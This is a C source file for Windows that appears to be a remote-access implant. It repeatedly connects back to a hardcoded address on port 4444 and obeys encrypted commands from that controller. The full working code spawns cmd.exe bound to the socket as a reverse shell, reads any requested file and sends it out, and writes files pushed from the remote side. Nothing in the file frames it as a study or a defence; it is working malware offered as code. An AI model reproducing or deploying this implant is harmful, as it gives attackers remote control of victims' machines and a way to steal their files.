#include <stdio.h>
#include <stdlib.h>
#include<winsock2.h>
#include<Windows.h>
#include<process.h>
#include<io.h>
#include "helper.h"
#include "encryption.h"
#define DEFAULT_BUFLEN 128
#define MAX_READ 112

#pragma comment(lib, "ws2_32.lib") //for dynamically linked library
#pragma warning(disable:4996) 
void CreateShell(int port);
int startup();
void recieve();
void upload();
void ping();
int port = 4444;
SOCKET sockt; //global sockt
int main() {
	//trail();
	
	while (TRUE) {
		//search for connection every 5 seconds
		Sleep(5000);
		int con = startup();
		// waiting for a connection checks every 5 seconds
		if (con == 1) {
			unsigned char RecvData[DEFAULT_BUFLEN];
			printf("start of while");
			while (TRUE) {
				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);
				unsigned char plaintext[DEFAULT_BUFLEN];
				int length = decrypt(RecvData, RecvCode, plaintext);
				plaintext[length] = '\0';
				printf(plaintext);
				if (strcmp(plaintext, "conend\n") == 0) {//if user sends exit then program resets
					closesocket(sockt);
					WSACleanup();
					exit(0);
				}
				else if (strcmp(plaintext, "shell\n") == 0) {// starts shell process if user types shell
					//start shell process
					CreateShell(port);
				}
				else if (strcmp(plaintext, "send\n") == 0) {// starts send process
					recieve();
				}
				else if (strcmp(plaintext, "download\n") == 0) {
					upload();
				}
				else if (strcmp(plaintext, "ping\n") == 0) {
					ping();
				}
			}
		}
	
	}
	
	return 0;
}  
void ping() { //simply for testing 
	printf("entered ping");
	while (TRUE) {
		//setup decrypt var
		unsigned char plaintext[DEFAULT_BUFLEN];
		unsigned char RecvData[DEFAULT_BUFLEN];
		memset(RecvData, 0, sizeof(RecvData));

		//recieve data from sockt put length of data in RecvCode
		int RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);

		//decrypt and store length decrypted in val
		int val = decrypt(RecvData, RecvCode, plaintext);
		printf("past decrypt\n");
		//add EOF so that string in printable
		plaintext[val] = '\0';
		printf(plaintext);


		//setup encrypt var
		unsigned char encryped[DEFAULT_BUFLEN];
		memset(encryped, 0, sizeof(encryped));

		//encrypt plaintext into encrypted buffer
		encrypt(plaintext, val, encryped);
		printf("\npast encrypt");
		//send encrypted back over socket
		send(sockt, encryped, DEFAULT_BUFLEN, 0);
		printf("sent item");
	}
}
void CreateShell(int port) {
		STARTUPINFO ini_processo;
		PROCESS_INFORMATION processo_info;
		memset(&ini_processo, 0, sizeof(ini_processo));
		char command[] = "cmd.exe";

		ini_processo.cb = sizeof(ini_processo);
		ini_processo.dwFlags = (STARTF_USESTDHANDLES);
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)sockt;

		CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info); //create shell
		WaitForSingleObject(processo_info.hProcess, INFINITE); //wait for user to close shell on their end

		//cleanup of threads
		CloseHandle(processo_info.hThread);
		CloseHandle(processo_info.hProcess);
	
}
int startup() {
	WSADATA wsa;
	struct sockaddr_in revsockaddr;
	printf("\nstarting WINSOCK...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("\nfailed startup");

	}

	printf("\nsuccessfully started");

	if ((sockt = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET)
	{
		printf("socket could not be created");
	}

	revsockaddr.sin_family = AF_INET;
	revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.2");

	printf("\nsocket created ");


	if (WSAConnect(sockt, (struct sockaddr*) & revsockaddr, sizeof(revsockaddr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
		closesocket(sockt);
		WSACleanup();
		return 0;
	}
	return 1;
}
void recieve() {

	//init buffer for recv data
	unsigned char RecvData[DEFAULT_BUFLEN];
	memset(RecvData, 0, sizeof(RecvData));

	//recv filename from server
	char filename[DEFAULT_BUFLEN];
	memset(filename, 0, sizeof(filename));
	int RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);

	//decrypt
	int val = decrypt(RecvData, RecvCode, filename);

	//for error checking
	filename[val] = '\0';
	printf(filename);

	//initialize buffer
	unsigned char buffer[DEFAULT_BUFLEN];
	memset(buffer, 0, sizeof(buffer));
	auth(sockt); //1 byte ACK
	
	//find file size being sent
	char tmp[10];
	memset(tmp, 0, 10); //maximum of 10^10 byte file
	int totalbytes = 0; //find total number of bytes being send
	int recvbytes = 0; //total bytes recieved so far
	RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0); //get buffer with filesize
	val = decrypt(RecvData, RecvCode, tmp);
	totalbytes = atoi(tmp);
	printf(tmp);
	auth(sockt);

	FILE* ptr = fopen(filename, "wb"); 

	/*
	//calculate leftover bytes to determine size of final buffer
	int extra = (totalbytes % DEFAULT_BUFLEN); 
	
	char* tmpbuff = NULL; 
	while (tmpbuff == NULL) //prevent tmpbuff being null
		tmpbuff = malloc(extra * sizeof(char)); //makes tmpbuff size of remainder buff
	*/
	memset(buffer, 0, sizeof(buffer)); //clean buffer
	printf("/n at while loop\n");
	while (recvbytes < totalbytes) {
		/*
		if (totalbytes - recvbytes < DEFAULT_BUFLEN) {
			recv(sockt, tmpbuff, extra, MSG_WAITALL);
			decrypt(tmpbuff, extra, buffer);
			fwrite(buffer, extra, 1, ptr);
			free(tmpbuff);
			break;
		}
		*/
		printf("in while loop\n");
		printf("%d / %d byes recieved\n", recvbytes, totalbytes);
		RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);
		int bytesrecv = decrypt(RecvData, RecvCode, buffer);
		printf("bytes recieved %d \n", bytesrecv);

		fwrite(buffer, bytesrecv, 1, ptr);
		recvbytes += bytesrecv;
		printf("end totalbytes = %d \n", recvbytes);
	}
	fclose(ptr); //close file
	auth(sockt);
}


void upload() {
	//init general buffer
	unsigned char RecvData[DEFAULT_BUFLEN];
	memset(RecvData, 0, sizeof(RecvData));

	//init file_path var for later use
	char file_path[DEFAULT_BUFLEN];
	memset(file_path, 0, sizeof(file_path)); // ititialize to all zeros

	//recv file path to gen buffer
	int RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);

	//decrypt
	int val = decrypt(RecvData, RecvCode, file_path);
	auth(sockt); //send auth

	//for error checking
	file_path[val] = '\0';
	printf(file_path);




	int size = findSize(file_path); //get filesize


	if (size != -1) {

		char sizechar[10] = { '\0' };
		int written = sprintf(sizechar, "%d", size); //convert int to char type for sending

		val = encrypt(sizechar, written, RecvData); //encrypt sizechar to buffer



		send(sockt, RecvData, val, 0); //send file size

		int rec = recv(sockt, RecvData, DEFAULT_BUFLEN, 0); //expecting one byte confirm

		if (rec == 1) {
			FILE* fp = fopen(file_path, "rb"); //read in bytes

			int bytesread = 0; //total bytes of file read

			char ReadBuff[MAX_READ]; //init reading buffer
			memset(ReadBuff, 0, sizeof(ReadBuff));

			while (bytesread < size) {

				int rd = fread(ReadBuff, 1, MAX_READ, fp); //read 112 bytes from file

				//encrypt read data into buffer for sending
				val = encrypt(ReadBuff, rd, RecvData);

				send(sockt, RecvData, val, 0); //send bytes of size val

				if (rd == 0) break; //means did not read full buffsize and thus EOF reached

				bytesread += rd; //add amount sent to bytes total
			}
			printf("file successfully read and sent");
		}

	}

}
